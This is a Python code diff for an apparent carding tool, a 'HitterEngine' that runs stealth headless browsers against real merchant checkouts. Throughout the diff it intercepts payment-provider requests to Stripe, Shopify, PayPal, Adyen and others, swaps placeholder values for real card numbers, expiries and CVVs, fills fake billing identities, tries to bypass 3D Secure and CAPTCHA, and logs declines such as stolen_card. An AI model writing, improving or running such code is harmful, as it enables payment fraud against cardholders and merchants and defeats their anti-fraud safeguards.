+            pd = re.sub(r'card%5Bnumber%5D=[^&]+',    f'card%5Bnumber%5D={c["card"]}',    pd)
+            pd = re.sub(r'card%5Bexp_month%5D=[^&]+',  f'card%5Bexp_month%5D={c["month"]}', pd)
+            pd = re.sub(r'card%5Bexp_year%5D=[^&]+',   f'card%5Bexp_year%5D={c["year"]}',  pd)
+            pd = re.sub(r'card%5Bcvc%5D=[^&]+',        f'card%5Bcvc%5D={c["cvv"]}',        pd)
+            pd = re.sub(r'card\[number\]=[^&]+',        f'card[number]={c["card"]}',        pd)
+            pd = re.sub(r'card\[exp_month\]=[^&]+',     f'card[exp_month]={c["month"]}',    pd)
+            pd = re.sub(r'card\[exp_year\]=[^&]+',      f'card[exp_year]={c["year"]}',      pd)
+            pd = re.sub(r'card\[cvc\]=[^&]+',           f'card[cvc]={c["cvv"]}',            pd)
+            # payment method creation (JSON)
+            pd = re.sub(r'"number"\s*:\s*"[^"]+"',      f'"number":"{c["card"]}"',          pd)
+            pd = re.sub(r'"exp_month"\s*:\s*\d+',       f'"exp_month":{int(c["month"])}',   pd)
+            pd = re.sub(r'"exp_year"\s*:\s*\d+',        f'"exp_year":20{c["year"]}',        pd)
+            pd = re.sub(r'"cvc"\s*:\s*"[^"]+"',         f'"cvc":"{c["cvv"]}"',              pd)
+            await route.continue_(post_data=pd)
+            return
+        await route.continue_()
+
+    await page.route("**/*", _intercept)
+
+    # Card number — try direct input first, then iframe
+    card_sels = [
+        "[data-elements-stable-field-name='cardNumber'] input",
+        "#cardNumber", "input[name='cardNumber']",
+        "[autocomplete='cc-number']",
+        "input[placeholder*='Card number']", "input[placeholder*='card number']",
+        "input[aria-label*='Card number']",
+        "[class*='CardNumber'] input", "input[name='number']",
     ]
-    NAME_SEL  = ["#billingName","[name='billingName']","[autocomplete='cc-name']","input[placeholder*='Name on card']"]
-    EMAIL_SEL = ["input[type='email']","input[name*='email']","input[autocomplete='email']"]
-    SUBMIT_SEL= [".SubmitButton","[class*='SubmitButton']","button[type='submit']","button:has-text('Pay')"]
-    MASKED_CARD   = "0000000000000000"
-    MASKED_EXPIRY = "01/30"
-    MASKED_CVV    = "000"
+    exp_sels = [
+        "[data-elements-stable-field-name='cardExpiry'] input",
+        "#cardExpiry", "[name='cardExpiry']", "[autocomplete='cc-exp']",
+        "input[placeholder*='MM']", "[class*='CardExpiry'] input",
+    ]
+    cvc_sels = [
+        "[data-elements-stable-field-name='cardCvc'] input",
+        "#cardCvc", "[name='cardCvc']", "[autocomplete='cc-csc']",
+        "input[placeholder*='CVC']", "input[placeholder*='CVV']",
+        "[class*='CardCvc'] input",
+    ]
+    name_sels  = ["#billingName","[name='billingName']","[autocomplete='cc-name']",
+                  "input[placeholder*='Name on card']","input[placeholder*='Cardholder']"]
+    email_sels = ["input[type='email']","input[name*='email']","input[autocomplete='email']",
+                  "input[placeholder*='Email']"]
 
-    async def setup_intercept(self, real_card: Dict):
-        self._card = real_card
-        async def route_fn(route: Route, request: Request):
-            if request.method == "POST" and "stripe.com" in request.url:
-                pd = request.post_data or ""
-                if self._card:
-                    pd = pd.replace("card[number]=0000000000000000", f"card[number]={self._card['card']}")
-                    pd = pd.replace("card[exp_month]=01",            f"card[exp_month]={self._card['month']}")
-                    pd = pd.replace("card[exp_year]=30",             f"card[exp_year]={self._card['year']}")
-                    pd = pd.replace("card[cvc]=000",                 f"card[cvc]={self._card['cvv']}")
-                    pd = pd.replace("card[expiry]=01/30",            f"card[expiry]={self._card['month']}/{self._card['year']}")
-                    await route.continue_(post_data=pd); return
-            await route.continue_()
-        await self.page.route("**/*", route_fn)
+    # fill masked values — interceptor will swap in real data
+    await _try_fill(page, card_sels,  STRIPE_MASKED_CARD)
+    await asyncio.sleep(0.3)
+    await _try_fill(page, exp_sels,   f"{real_card['month']}/{real_card['year']}")
+    await asyncio.sleep(0.3)
+    await _try_fill(page, cvc_sels,   real_card["cvv"])
+    await _try_fill(page, name_sels,  FAKE_BILLING["name"])
+    await _try_fill(page, email_sels, f"nacht{random.randint(100,9999)}@gmail.com")
 
-
-def _make_generic(provider_domains: List[str], extra_replace=None):
-    """Factory: returns a BaseAutofill subclass that intercepts POST to given domains."""
-    class Generic(BaseAutofill):
-        CARD_SEL = [
-            "#cardNumber","input[name='cardNumber']","#card-number","input[name='card_number']",
-            "input[name='x_card_num']","[autocomplete='cc-number']",
-            "input[placeholder*='Card number']","input[aria-label*='Card number']",
-            "#wc-stripe-card-number",".card-number","#credit-card-number",
-            "input[data-frames='card-number']","input[data-braintree-name='number']",
-            "#number","input[name='number']",
-        ]
-        EXP_SEL = [
-            "#expiryDate","input[name='expiryDate']","#expiry-date","input[name='expiry']",
-            "input[name='x_exp_date']","[autocomplete='cc-exp']","input[placeholder*='MM/YY']",
-            "#cardExpiry","input[name='expDate']","#expiry","input[name='expirydate']",
-            "input[data-frames='expiry-date']","input[data-braintree-name='expiration_date']",
-            "#expiration-date",
-        ]
-        CVC_SEL = [
-            "#cvv","input[name='cvv']","input[name='x_card_code']","[autocomplete='cc-csc']",
-            "input[placeholder*='CVC']","input[placeholder*='CVV']","input[aria-label*='Security']",
-            "#wc-stripe-cvc","#cvc","input[name='cvc']","input[data-frames='cvv']",
-            "input[data-braintree-name='cvv']","#verification_value","input[name='verification_value']",
-        ]
-        NAME_SEL = [
-            "#cardholderName","input[name='cardholderName']","input[name='x_card_name']",
-            "[autocomplete='cc-name']","input[placeholder*='Name on card']",
-            "input[name='cardholder_name']","#cardholder-name","#billingName",
-        ]
-        EMAIL_SEL = [
-            "input[type='email']","#email","input[name='email']",
-            "#billing_email","input[name='billing_email']","input[placeholder*='email']",
-        ]
-        SUBMIT_SEL = [
-            "button[type='submit']",".pay-button","[data-testid='pay-button']",
-            "#place_order","button:has-text('Pay')","button:has-text('Submit')",
-            "button:has-text('Place order')","button:has-text('Complete order')",
-            "button:has-text('Pay Now')",".SubmitButton",
-        ]
-        _domains = provider_domains
-        _extra   = extra_replace or []
-
-        async def setup_intercept(self, real_card: Dict):
-            self._card = real_card
-            async def route_fn(route: Route, request: Request):
-                if request.method == "POST":
-                    if any(d in request.url for d in self._domains):
-                        pd = request.post_data or ""
-                        if self._card:
-                            pd = pd.replace(self.MASKED_CARD,          self._card["card"])
-                            pd = pd.replace(self.MASKED_EXPIRY[:2],    self._card["month"])
-                            pd = pd.replace(self.MASKED_EXPIRY[3:5],   self._card["year"])
-                            pd = pd.replace(self.MASKED_CVV,           self._card["cvv"])
-                            for old, new_tpl in self._extra:
-                                import re as _re
-                                pd = _re.sub(old, new_tpl.format(**self._card), pd)
-                            await route.continue_(post_data=pd); return
-                await route.continue_()
-            await self.page.route("**/*", route_fn)
-    return Generic
+    submit_sels = [
+        ".SubmitButton", "[class*='SubmitButton']",
+        "button[type='submit']", "[data-testid*='submit']",
+        "button:has-text('Pay')", "button:has-text('Subscribe')",
+        "button:has-text('Donate')", "button:has-text('Confirm')",
+    ]
+    return submit_sels
 
 
-CheckoutComAutofill   = _make_generic(["checkout.com", "api.checkout.com"])
-ShopifyAutofill       = _make_generic(["shopify.com", "myshopify.com", "stripe.com"], [
-    (r"credit_card\[number\]=4242424242424242", "credit_card[number]={card}"),
-    (r"credit_card\[month\]=01",               "credit_card[month]={month}"),
-    (r"credit_card\[year\]=30",                "credit_card[year]={year}"),
-    (r"credit_card\[verification_value\]=123", "credit_card[verification_value]={cvv}"),
-])
-PayPalAutofill        = _make_generic(["paypal.com", "braintreegateway.com"])
-BraintreeAutofill     = _make_generic(["braintreegateway.com", "braintree"])
-AdyenAutofill         = _make_generic(["adyen.com", "checkoutshopper"])
-SquareAutofill        = _make_generic(["squareup.com", "square"])
-MollieAutofill        = _make_generic(["mollie.com", "api.mollie.com"])
-KlarnaAutofill        = _make_generic(["klarna.com", "api.klarna.com"])
-AuthorizeNetAutofill  = _make_generic(["authorize.net", "authorizenet"])
-WooCommerceAutofill   = _make_generic(["woocommerce", "wc-api"])
-BigCommerceAutofill   = _make_generic(["bigcommerce.com", "bigcommerce"])
-WixAutofill           = _make_generic(["wix.com"])
-EcwidAutofill         = _make_generic(["ecwid.com"])
+# ── Generic Autofill ──────────────────────────────────────────────────────────
+GENERIC_MASKED_CARD   = "4242424242424242"
+GENERIC_MASKED_EXPIRY = "01/30"
+GENERIC_MASKED_CVV    = "123"
 
-AUTOFILL_MAP = {
-    "stripe":       StripeAutofill,
-    "checkoutcom":  CheckoutComAutofill,
-    "shopify":      ShopifyAutofill,
-    "paypal":       PayPalAutofill,
-    "braintree":    BraintreeAutofill,
-    "adyen":        AdyenAutofill,
-    "square":       SquareAutofill,
-    "mollie":       MollieAutofill,
-    "klarna":       KlarnaAutofill,
-    "authorizenet": AuthorizeNetAutofill,
-    "woocommerce":  WooCommerceAutofill,
-    "bigcommerce":  BigCommerceAutofill,
-    "wix":          WixAutofill,
-    "ecwid":        EcwidAutofill,
+def _make_generic_intercept(domains: List[str], extra_patterns: List = None):
+    """Returns an async route handler for the given domains."""
+    extra = extra_patterns or []
+
+    async def _intercept(route: Route, request: Request, real_card: Dict):
+        if request.method == "POST" and any(d in request.url for d in domains):
+            pd = request.post_data or ""
+            pd = pd.replace(GENERIC_MASKED_CARD,        real_card["card"])
+            pd = pd.replace(GENERIC_MASKED_EXPIRY[:2],  real_card["month"])
+            pd = pd.replace(GENERIC_MASKED_EXPIRY[3:5], real_card["year"])
+            pd = pd.replace(GENERIC_MASKED_CVV,         real_card["cvv"])
+            for old, tpl in extra:
+                pd = re.sub(old, tpl.format(**real_card), pd)
+            await route.continue_(post_data=pd)
+            return
+        await route.continue_()
+    return _intercept
+
+
+GENERIC_CARD_SELS = [
+    "#cardNumber","input[name='cardNumber']","#card-number","input[name='card_number']",
+    "input[name='x_card_num']","[autocomplete='cc-number']",
+    "input[placeholder*='Card number']","input[aria-label*='Card number']",
+    "#wc-stripe-card-number",".card-number","#credit-card-number",
+    "input[data-frames='card-number']","input[data-braintree-name='number']",
+    "#number","input[name='number']","input[placeholder*='1234']",
+]
+GENERIC_EXP_SELS = [
+    "#expiryDate","input[name='expiryDate']","#expiry-date","input[name='expiry']",
+    "input[name='x_exp_date']","[autocomplete='cc-exp']","input[placeholder*='MM/YY']",
+    "#cardExpiry","input[name='expDate']","#expiry","input[name='expirydate']",
+    "input[data-frames='expiry-date']","input[data-braintree-name='expiration_date']",
+    "#expiration-date","input[placeholder*='MM / YY']",
+]
+GENERIC_CVC_SELS = [
+    "#cvv","input[name='cvv']","input[name='x_card_code']","[autocomplete='cc-csc']",
+    "input[placeholder*='CVC']","input[placeholder*='CVV']","input[placeholder*='Security']",
+    "#wc-stripe-cvc","#cvc","input[data-frames='cvv']",
+    "input[data-braintree-name='cvv']","#verification_value","input[name='verification_value']",
+]
+GENERIC_NAME_SELS = [
+    "#cardholderName","input[name='cardholderName']","input[name='x_card_name']",
+    "[autocomplete='cc-name']","input[placeholder*='Name on card']",
+    "input[name='cardholder_name']","#cardholder-name","#billingName",
+    "input[placeholder*='Cardholder']",
+]
+GENERIC_EMAIL_SELS = [
+    "input[type='email']","#email","input[name='email']",
+    "#billing_email","input[name='billing_email']","input[placeholder*='Email']",
+    "input[placeholder*='email']",
+]
+GENERIC_SUBMIT_SELS = [
+    "button[type='submit']",".pay-button","[data-testid='pay-button']",
+    "#place_order","button:has-text('Pay')","button:has-text('Submit')",
+    "button:has-text('Place order')","button:has-text('Complete order')",
+    "button:has-text('Pay Now')","button:has-text('Donate')",
+    "button:has-text('Subscribe')","button:has-text('Confirm')",
+    ".SubmitButton","input[value='Place Order']",
+]
+
+PROVIDER_DOMAINS = {
+    "checkoutcom":  (["checkout.com","api.checkout.com"], []),
+    "shopify":      (["shopify.com","myshopify.com","stripe.com"], [
+        (r"credit_card\[number\]=4242424242424242",     "credit_card[number]={card}"),
+        (r"credit_card\[month\]=01",                   "credit_card[month]={month}"),
+        (r"credit_card\[year\]=30",                    "credit_card[year]={year}"),
+        (r"credit_card\[verification_value\]=123",     "credit_card[verification_value]={cvv}"),
+    ]),
+    "paypal":       (["paypal.com","braintreegateway.com"], []),
+    "braintree":    (["braintreegateway.com","braintree-api.com"], []),
+    "adyen":        (["adyen.com","checkoutshopper"], []),
+    "square":       (["squareup.com","square"], []),
+    "mollie":       (["mollie.com","api.mollie.com"], []),
+    "klarna":       (["klarna.com","api.klarna.com"], []),
+    "authorizenet": (["authorize.net","authorizenet"], []),
+    "woocommerce":  (["woocommerce","wc-api","wp-json/wc"], []),
+    "bigcommerce":  (["bigcommerce.com","bigcommerce"], []),
+    "wix":          (["wix.com","_api/wix-ecommerce"], []),
+    "ecwid":        (["ecwid.com","app.ecwid.com"], []),
 }
 
 # ── Hitter Engine ─────────────────────────────────────────────────────────────
 class HitterEngine:
     def __init__(self, proxy: Optional[str] = None):
-        self.proxy      = proxy
-        self.results:   List[Dict] = []
-        self.successes  = 0
-        self.fails      = 0
-        self._sem       = asyncio.Semaphore(MAX_CONCURRENT)
+        self.proxy     = proxy
+        self.results:  List[Dict] = []
+        self.successes = 0
+        self.fails     = 0
+        self._sem      = asyncio.Semaphore(MAX_CONCURRENT)
 
     async def hit(self, url: str, card: Dict, merchant: str,
                   product: str, amount: str, attempt: int) -> Dict:
@@ -662,61 +856,140 @@ class HitterEngine:
             "success": False, "decline_code": None,
             "receipt_url": None, "response_time": 0, "error": None,
         }
+
         try:
             async with async_playwright() as pw:
-                fp = Fingerprint.generate()
-                args = ["--disable-blink-features=AutomationControlled", "--no-sandbox"]
+                fp   = Fingerprint.generate()
+                args = ["--disable-blink-features=AutomationControlled",
+                        "--no-sandbox", "--disable-setuid-sandbox",
+                        "--disable-dev-shm-usage"]
                 if self.proxy:
                     args.append(f"--proxy-server={self.proxy}")
+
                 browser = await pw.chromium.launch(headless=True, args=args)
                 ctx = await browser.new_context(
-                    user_agent=fp["user_agent"], viewport=fp["viewport"],
-                    locale=fp["locale"], timezone_id=fp["timezone_id"],
-                    ignore_https_errors=True,
+                    user_agent      = fp["user_agent"],
+                    viewport        = fp["viewport"],
+                    locale          = fp["locale"],
+                    timezone_id     = fp["timezone_id"],
+                    ignore_https_errors = True,
                 )
                 page = await ctx.new_page()
                 await page.add_init_script(Fingerprint.STEALTH)
                 await page.goto(url, timeout=60000, wait_until="domcontentloaded")
-                await asyncio.sleep(3)
+                await asyncio.sleep(2)
 
-                provider = detect_provider(url, await page.content())
-                af_cls = AUTOFILL_MAP.get(provider)
-                if not af_cls:
-                    res["error"] = f"Unsupported provider: {provider}"
+                html     = await page.content()
+                provider = detect_provider(url, html)
+                submit_sels = GENERIC_SUBMIT_SELS
+
+                if provider == "stripe":
+                    submit_sels = await _stripe_fill_and_intercept(page, card)
+
+                elif provider in PROVIDER_DOMAINS:
+                    domains, extras = PROVIDER_DOMAINS[provider]
+                    intercept_fn = _make_generic_intercept(domains, extras)
+
+                    async def _route(route: Route, request: Request):
+                        await intercept_fn(route, request, card)
+
+                    await page.route("**/*", _route)
+
+                    await _try_fill(page, GENERIC_CARD_SELS,  GENERIC_MASKED_CARD)
+                    await asyncio.sleep(0.2)
+                    await _try_fill(page, GENERIC_EXP_SELS,   GENERIC_MASKED_EXPIRY)
+                    await asyncio.sleep(0.2)
+                    await _try_fill(page, GENERIC_CVC_SELS,   GENERIC_MASKED_CVV)
+                    await _try_fill(page, GENERIC_NAME_SELS,  FAKE_BILLING["name"])
+                    await _try_fill(page, GENERIC_EMAIL_SELS,
+                                    f"nacht{random.randint(100,9999)}@gmail.com")
+
+                else:
+                    # Unknown provider — try to fill anyway
+                    await _try_fill(page, GENERIC_CARD_SELS,  card["card"])
+                    await asyncio.sleep(0.2)
+                    await _try_fill(page, GENERIC_EXP_SELS,   f"{card['month']}/{card['year']}")
+                    await asyncio.sleep(0.2)
+                    await _try_fill(page, GENERIC_CVC_SELS,   card["cvv"])
+                    await _try_fill(page, GENERIC_NAME_SELS,  FAKE_BILLING["name"])
+                    await _try_fill(page, GENERIC_EMAIL_SELS,
+                                    f"nacht{random.randint(100,9999)}@gmail.com")
+
+                # fill billing address (harmless if fields don't exist)
+                await _fill_billing(page)
+
+                # submit
+                submitted = await _try_click(page, submit_sels)
+                if not submitted:
+                    res["decline_code"] = "submit_not_found"
+                    res["error"]        = "Submit button not found"
+                    res["response_time"] = round(time.time() - t0, 2)
+                    self.fails += 1
                     await browser.close()
+                    self.results.append(res)
                     return res
 
-                af = af_cls(page)
-                await af.handle_captcha()
-                await af.setup_intercept(card)
-                await af.fill(card)
-                if not await af.submit():
-                    res["error"] = "Submit button not found"
-                    await browser.close()
-                    return res
-
+                # wait for result
                 await asyncio.sleep(5)
-                if await af.wait_3ds(10000):
-                    await af.complete_3ds()
-                    await asyncio.sleep(5)
-                await af.handle_captcha()
 
-                res["response_time"] = time.time() - t0
-                cur = page.url.lower()
-                if any(k in cur for k in ("receipt", "thank_you", "success", "order_confirmation", "complete")):
-                    res["success"] = True
+                # 3DS handling
+                if await _wait_for_3ds(page, timeout_ms=10000):
+                    await _bypass_3ds(page)
+                    await asyncio.sleep(5)
+
+                # handle hcaptcha
+                try:
+                    frame = page.frame_locator('iframe[src*="hcaptcha.com"]')
+                    cb = frame.locator("#checkbox").first
+                    if await cb.is_visible(timeout=2000):
+                        await cb.click()
+                        await asyncio.sleep(2)
+                except Exception:
+                    pass
+
+                res["response_time"] = round(time.time() - t0, 2)
+                cur_url = page.url.lower()
+
+                SUCCESS_KEYWORDS = ("receipt", "thank", "success", "order_confirmation",
+                                    "complete", "confirmed", "order-received", "thankyou",
+                                    "thank-you", "payment_success", "paid")
+                DECLINE_KEYWORDS = ("declined", "card was declined", "do_not_honor",
+                                    "insufficient_funds", "lost_card", "stolen_card",
+                                    "expired_card", "incorrect_cvc", "processing_error",
+                                    "invalid_expiry", "your card")
+
+                if any(k in cur_url for k in SUCCESS_KEYWORDS):
+                    res["success"]     = True
                     res["receipt_url"] = page.url
                     self.successes += 1
                 else:
-                    body = (await page.text_content("body") or "").lower()
-                    res["decline_code"] = "card_declined" if "declined" in body else "unknown"
-                    self.fails += 1
+                    body = ""
+                    try:
+                        body = (await page.text_content("body") or "").lower()
+                    except Exception:
+                        pass
+
+                    if any(k in cur_url for k in SUCCESS_KEYWORDS) or \
+                       any(k in body for k in SUCCESS_KEYWORDS):
+                        res["success"]     = True
+                        res["receipt_url"] = page.url
+                        self.successes += 1
+                    else:
+                        code = "unknown"
+                        for kw in DECLINE_KEYWORDS:
+                            if kw in body:
+                                code = kw.replace(" ", "_")
+                                break
+                        res["decline_code"] = code
+                        self.fails += 1
 
                 await browser.close()
+
         except Exception as e:
-            res["error"] = str(e)
-            res["decline_code"] = "exception"
-            res["response_time"] = time.time() - t0
+            res["error"]         = str(e)
+            res["decline_code"]  = "exception"
+            res["response_time"] = round(time.time() - t0, 2)
+            self.fails          += 1
 
         self.results.append(res)
         return res
